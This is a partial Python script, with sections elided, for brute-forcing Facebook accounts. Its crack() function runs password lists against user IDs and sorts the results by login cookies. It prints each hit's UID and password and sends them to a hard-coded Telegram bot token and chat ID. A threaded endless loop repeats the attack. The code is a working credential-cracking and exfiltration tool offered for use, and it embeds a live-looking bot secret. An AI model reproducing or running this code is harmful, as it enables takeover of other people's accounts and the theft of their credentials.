...
import requests
import threading
Token = '5817175143:AAHDYEPBRk8tx5luYgQxlcu1h6efG9VJMmU'
IDd = '6168232921'
cookies = {
...
def crack(idf,pwv):
	...
	sys.stdout.write(f"\r (ALSOLTAN) {P}{b}{loop}{P}•{b}{len(id)}{P}  • OK:{P}{H}{ok}{P} •  CP:{P}{M}{cp}{P} • ({bo}{'{:.0%}'.format(loop/float(len(id)))}  "),
	sys.stdout.flush()
	...
	for pw in pwv:
		try:
			...
			if "checkpoint" in po.cookies.get_dict().keys():
				print(f'\r\x1b[1;91m \n-------------------(Ali-CP)---------------------- \n└──UID: {idf}\n└──PASS: {pw}');requests.post(f"""https://api.telegram.org/bot{Token}/sendMessage?chat_id={IDd}&text=
~NEW EMAIL FACEBOOK [CP]
...
~""")
				...
				requests.post(f"""https://api.telegram.org/bot{Token}/sendMessage?chat_id={IDd}&text=
~NEW EMAIL FACEBOOK [OK]
___________________________
	•OK - FaceBook•
___________________________
ID : {idf} •
...
while True:
		try:threading.Thread(target=alaa,args=()).start();threading.Thread(target=alaa,args=()).start();time.sleep(0.5)
		except:pass
		menu()
